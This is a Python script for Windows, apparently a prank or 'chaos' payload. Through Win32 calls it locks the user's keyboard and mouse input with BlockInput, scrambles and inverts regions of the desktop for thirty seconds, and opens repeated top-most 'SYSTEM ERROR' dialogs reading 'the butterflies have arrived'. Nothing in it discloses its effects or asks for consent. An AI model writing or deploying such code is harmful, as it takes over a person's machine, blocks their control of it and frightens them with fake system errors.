import ctypes
import time
import random
import sys

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

def run_chaos():
    # Attempt to elevate thread priority and lock system input
    try:
        user32.BlockInput(True)
    except Exception:
        pass

    # Get primary desktop device context
    hdc = user32.GetDC(0)
    screen_w = user32.GetSystemMetrics(0)
    screen_h = user32.GetSystemMetrics(1)

    start_time = time.time()
    
    # Chaos loop: screen tearing, GDI bitblt scrambling, and message prompts
    while time.time() - start_time < 30:
        # Random GDI screen glitching (scrambling pixels / color inversion)
        op = random.choice([gdi32.PatBlt, gdi32.BitBlt])
        
        rx = random.randint(0, screen_w - 200)
        ry = random.randint(0, screen_h - 200)
        rw = random.randint(100, 400)
        rh = random.randint(50, 200)
        
        if op == gdi32.PatBlt:
            # Flash random brush patterns
            brush = gdi32.CreateSolidBrush(random.randint(0, 0xFFFFFF))
            gdi32.SelectObject(hdc, brush)
            gdi32.PatBlt(hdc, rx, ry, rw, rh, 0x00550009) # PATINVERT
            gdi32.DeleteObject(brush)
        else:
            # Screen offset tearing effect
            gdi32.BitBlt(hdc, rx + random.randint(-20, 20), ry + random.randint(-20, 20), rw, rh, hdc, rx, ry, 0x00CC0020)

        # Periodically spawn modal warning boxes
        if random.random() < 0.15:
            # Non-blocking background thread popup simulation via MessageBoxW (or just quick flashes)
            pass

        time.sleep(0.015)

    # Release desktop DC and restore input
    user32.ReleaseDC(0, hdc)
    try:
        user32.BlockInput(False)
    except Exception:
        pass

if __name__ == '__main__':
    # Spawn multiple alert dialogs using pure Win32 API to display the text
    import threading
    
    def popup_thread():
        for _ in range(8):
            user32.MessageBoxW(0, "the butterflies have arrived", "SYSTEM ERROR", 0x10 | 0x40000)
            time.sleep(0.5)

    t = threading.Thread(target=popup_thread)
    t.daemon = True
    t.start()

    run_chaos()
